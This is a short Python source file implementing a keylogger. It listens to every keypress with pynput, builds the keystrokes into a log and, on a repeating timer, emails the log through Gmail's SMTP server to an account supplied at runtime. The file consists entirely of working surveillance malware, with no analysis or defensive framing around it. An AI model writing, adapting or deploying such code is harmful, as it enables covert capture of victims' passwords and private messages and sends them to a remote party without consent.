import pynput, threading, smtplib


# log = "" #global variable


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def process_keys(self, key):
        # global log
        # print(key)
        try:
            # log = log + str(key.char)
            current_key = str(key.char)
            # self.append_to_log(str(key.char))
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)
        # print(log)

    def report(self):
        # global log
        # print(self.log)
        # self.log = " "
        self.send_mail(self.email, self.password, "\n\n"+self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
